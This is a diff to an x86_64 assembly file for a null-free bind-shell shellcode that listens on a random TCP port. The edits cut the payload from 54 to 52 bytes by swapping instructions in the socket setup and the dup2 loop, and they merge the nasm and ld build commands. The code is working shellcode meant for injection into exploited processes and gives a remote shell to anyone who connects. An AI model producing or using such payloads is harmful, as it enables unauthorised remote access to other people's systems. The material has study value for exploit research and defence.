@@ -37,12 +37,12 @@
 
 ;   tiny_shell_bind_tcp_random_port_x86_64
 ;
-;   * 54 bytes
+;   * 52 bytes
 ;   * null-free
 ;
 ;
-;   # nasm -f elf64 tiny_shell_bind_tcp_random_port_x86_64.asm
-;   # ld -m elf_x86_64 tiny_shell_bind_tcp_random_port_x86_64.o -o \
+;   # nasm -f elf64 tiny_shell_bind_tcp_random_port_x86_64.asm; \
+;     ld -m elf_x86_64 tiny_shell_bind_tcp_random_port_x86_64.o -o \
 ;     tiny_shell_bind_tcp_random_port_x86_64
 ;
 ;   Testing
@@ -78,9 +78,8 @@ _start:
 	; Zeroing rdx, search about cdq instruction for understanding
 	cdq			; IPPROTO_IP = 0 (int) - rdx
 
-	push rdx
+	push 1			; SOCK_STREAM = 1 (int)
 	pop rsi
-	inc esi			; SOCK_STREAM = 1 (int)
 
 	push 2			; AF_INET = 2 (int)
 	pop rdi
@@ -118,10 +117,8 @@ _start:
 	; int dup2(int oldfd, int newfd);
 	; dup2(clientfd, ...)
 
-	push rdi		; push the sockfd integer to use as the loop counter (rsi)
-	pop rsi
-	
 	xchg edi, eax		; put the clientfd returned from accept into rdi
+	xchg esi, eax		; put the sockfd integer into rsi to use as the loop counter
 
 dup_loop:
 	dec esi			; decrement loop counter
